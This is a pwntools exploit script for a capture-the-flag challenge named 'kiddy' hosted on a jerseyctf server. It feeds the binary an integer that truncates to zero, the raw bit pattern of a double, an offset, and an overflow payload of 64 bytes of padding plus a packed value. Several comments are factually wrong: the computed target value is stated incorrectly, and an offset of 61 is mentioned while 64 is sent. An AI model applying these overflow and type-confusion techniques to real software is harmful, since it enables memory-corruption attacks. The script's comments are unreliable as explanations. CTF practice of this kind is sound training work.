from pwn import *

# Set up the connection to the binary
p = process('./kiddy')
# For remote: p = remote('host', port)

p = remote("kiddypool.aws.jerseyctf.com", 9001)

p.recvuntil(b"How old are you")

# For the first check, we need a value that's > 0 as long int but <= 0 as int
# We can use a number that uses bits beyond the 32-bit range
# 0x100000000 = 2^32, which is positive as 64-bit but becomes 0 when truncated to 32-bit
p.sendline(b"4294967296")  # 2^32

p.recvuntil(b"Ok sport, take your first dive into the water")

# For the second check, we need the bit representation of 1.0 as a double
# In IEEE-754, double precision 1.0 = 0x3FF0000000000000
p.sendline(b"4607182418800017408")  # Decimal representation of 0x3FF0000000000000

p.recvuntil(b"Swim through the hoop!")

# For the third check, we need an offset to a non-zero byte in the struct
# The hoop field at offset 61 is set to 1

p.sendline(b"64")

p.recvuntil(b"That's pretty good! Now make your own course")

# For the fourth check, we need to set target->hoop to ((0x12345678)^(0xfedcba98))-0xff
# Which is 0xEC9FEBF1
expected = (0x12345678 ^ 0xfedcba98) - 0xff
print(f"Expected value: {hex(expected)}")  # Should be 0xEC9FEBF1

# Adjust padding to 64 bytes
padding = b"A" * 64
target_value = p32(expected)  # Little-endian by default

# Let's see the full payload for debugging
payload = padding + target_value
print(f"Payload length: {len(payload)}")
print(f"Target value in payload: {target_value.hex()}")

p.sendline(payload)
p.interactive()
# Get the flag
